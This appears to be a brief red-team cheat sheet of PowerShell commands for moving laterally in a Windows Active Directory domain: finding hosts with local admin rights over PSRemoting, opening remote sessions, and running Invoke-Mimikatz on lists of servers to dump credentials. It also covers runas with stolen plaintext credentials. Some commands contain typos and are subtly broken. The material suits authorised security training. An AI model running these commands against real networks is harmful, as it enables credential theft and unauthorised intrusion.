## Search for PSRemoting Capability

```powershell
PS C:\ad\Tools> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad\Tools> Find-PSRemotingLocalAdminAccess
```

## Enter a PSRemote Session

```powershell
$sess = New-PSSession -ComputerName computer.local
```


## Execute Commands Remotely
Use -Credential to pass a username/password
```powershell
#use to execute commands or scriptblocks
Invoke-Command -CompuerName namehere -ScriptBlock {whoami;hostname}
Invoke-Command -Scriptblock{Get-Process} -ComputerName(Get-Content<list_of_servers>)


#Use below to execute scripts from files
Invoke-Command -FilePath C:\scripts\Invoke-Mimikatz.ps1 -ComputerName(Get-Content<list_of_servers>)


#Use below to execute locally loaded function on the remote machines:
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName(Get-Content<list_of_servers>)


#In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName(Get-Content<list_of_servers>) -ArgumentList


#Below, a function call within the script is used:
Invoke-Command -Filepath C:\scripts\Invoke-Mimikatz.ps1 -ComputerName(Get-Content<list_of_servers>)


#Use below to execute "Stateful" commands using Invoke-Command:
$Sess=New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc=Get-Process} 
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name} 
#or to load a module onto the remote machine
Invoke-Command -Session$Sess -FilePath c:\AD\Tools\hello.ps1
#then enter into PSSession and use commands from that module 
Enter-PSSession -Session $sess
```

## For Plaintext Credentials

Use runas to spawn a powershell  session as that user

```cmd
runas /noprofile /user:example\username cmd
```